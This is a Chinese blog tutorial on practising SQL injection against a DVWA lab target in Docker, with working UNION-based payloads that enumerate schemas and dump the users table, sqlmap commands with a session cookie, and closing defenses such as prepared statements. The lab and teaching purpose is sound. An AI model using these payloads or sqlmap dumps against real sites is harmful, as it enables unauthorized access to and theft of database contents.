---
title: 记SQL注入漏洞操练
author: Pandaho
date: 2021-08-09 20:00:00 
categories: [Project] 
tags: [security]
image: /assets/img/sql-injection/cover.png
---




## 法律声明

**中华人民共和国刑法：** 第285、286、287条

**第二百八十五条** 违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

**第二百八十六条** 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役；后果特别严重的，处五年以上有期徒刑。违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。

**第二百八十七条** 利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。



## 用知识的土壤来填埋这些坑洞

注入漏洞一直以来都处于[OWASP](https://owasp.org/www-project-top-ten/)榜首  
我们可以看下该项目对于注入的解释  
几乎任何数据源都可以是注入向量、环境变量、参数、外部和内部 Web 服务以及所有类型的用户。
当攻击者可以向解释器发送恶意数据时，就会出现注入缺陷。
通过[乌云](http://wooyun.2xss.cc/)我们可以看到现实存在大量注入案例

所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。我们永远不要信任用户的输入，我们必须认定用户输入的数据都是不安全的，我们都需要对用户输入的数据进行过滤处理。  

## 危害：  

1、数据库信息泄露；  
2、私自添加系统账户；  
3、读写文件获取webshell；  
4、网页篡改：登录后台后发布恶意内容；  
5、网站挂马：拿到webshell获取服务器权限后，将网页木马挂在服务器上。 

这次我是使用DVWA搭建的靶机来进行SQL注入，DVWA的搭建方式我已经在其他文章详细写过了，这次就不再说明了，不过补充下几点，因为我是使用docker搭建的，我们要测试sql注入，有些操作需要我们进入容器再进行sql测试。  
```shell
启动容器后，我们先查看
docker ps   # 查看正在运行的容器 
确定DVWA的容器id，进入docker容器路径，进入对应id的容器，再启动mysql
docker exec -it id /bin/bash 

运行dvwa后，打开SQL Injection，我们测试输入参数，能看到返回的结果，通过查看php可以看到
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
后端服务器查询sql数据库的代码；
审计代码后我们再进行字符型注入测试成功
SELECT first_name, last_name FROM users WHERE user_id ='1' and 1=1 ;#';
这段代码是利用' 将1这个参数能and 1=1来进行逻辑运算符判断，后面加入#将其余的都注释掉。
通过发现字符型注入成功，我们再进行列数判断的注入
1' order by  1,2 #
1' union select 1,2 #
通过1，2，3，……进行增量，返回查询失败时，我们就可以判断该表的列数显示位。

ORDER BY 语句
ORDER BY 语句用于根据指定的列对结果集进行排序。
ORDER BY 语句默认按照升序对记录进行排序。

SQL UNION 操作符
UNION 操作符用于合并两个或多个 SELECT 语句的结果集。
请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。

1' union select 1,database() #
可以查询到当前数据库
1' union select 1,version() #
可以查询到版本信息
1' union select 1,system_user() #
可以查询到系统用户名
1' union select 1,user() #
可以查询到数据库用户名
1' union select 1,current_user() #
可以查询到当前用户名
1' union select 1,session_user() #
可以查询到连接数据库的用户名
1' union select 1,@@datadir #
可以查询到数据存储路径
1' union select 1,@@basedir #
可以查询到数据库安装路径
1' union select 1,@@version_compile_os #
可以查询到安装版本信息

那现在我们就可以来爆数据了，MySQL 自带的信息数据库：
performance_schema 用于性能分析；
information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。

1' union select 1,SCHEMA_NAME  from information_schema.SCHEMATA #
可以爆出系统现有的数据库，再优化下格式
1' union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA #

group_concat()
1、功能：将产生的同一个分组中的值连接起来，返回一个字符串结果。
2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator '分隔符'] )
说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。

我们之前已经爆出数据库名，现在再爆数据库内的表
1' union select 1,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='dvwa' #

爆表后再爆表字段
1' union select 1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='users' #

爆字段后就可以爆数据了
1' union select 1,group_concat(first_name) from users #
```
环环相扣，每一步都不可忽略，从外到内拿到数据，但是这个是公开库，我们是在提前知道数据库的结构情况下爆的，难度就低很多了。

现在我们知道爆破的基本操作了，那每次爆破都如此复杂显然是不够人性化的，人类的本质都是懒惰的，所以才会有一系列工具被开发出来，[sqlmap](https://sqlmap.org/)也是其中一个。

sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。

sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。

```shell
我们copy注入路径，启动sqlmap
sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#" 
-u #注入点

sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#" --cookie="PHPSESSID=is5s61h4atbfmjivb6vcn8ejh3; security=low" --batch
--cookie cookie注入
--batch 从不询问用户输入，使用所有默认配置。 
查询cookie的方法可以使用 javascript:alert(document.cookie) 或fidder 抓包查询
```
![图例](/assets/img/sql-injection/1.png)
```shell
sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#"  --cookie="PHPSESSID=is5s61h4atbfmjivb6vcn8ejh3; security=low" --batch --dbs
可以爆出目标数据库
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema

sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#"  --cookie="PHPSESSID=is5s61h4atbfmjivb6vcn8ejh3; security=low" --batch -D dvwa --tables 
知道数据库后，可以爆出表
-D “” #指定数据库名
--tables  数据库表

sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#"  --cookie="PHPSESSID=is5s61h4atbfmjivb6vcn8ejh3; security=low" --batch -D dvwa -T users  --columns
知道表后，再爆字段
–columns #列出字段
-T “” #指定表名

sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#"  --cookie="PHPSESSID=is5s61h4atbfmjivb6vcn8ejh3; security=low" --batch -D dvwa -T users  -C user,password --dump --stop 5
知道字段后爆内容，并且进行解密
-C “” #指定字段
–dump  #列出指定数据库的表的字段的数据
--stop xxx 输出指定字段数量

sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#"  --cookie="PHPSESSID=is5s61h4atbfmjivb6vcn8ejh3; security=low" --batch -D dvwa --count 
--count  爆出用户条目

```

由此可见sql注入的危害，而目前sql注入的防御方法主要有：  
代码层面：
1、转义用户输入的内容 
2、限制输入长度 
3、使用sql语句预处理（先将语句进行预编译，参数绑定后再传参）  
网络层面：部署waf（web防火墙）  
其他层面：定期进行安全渗透测试



## 参考来源

百度百科  
[sqlmap参数大全](https://www.cnblogs.com/Sylon/p/11747464.html)  

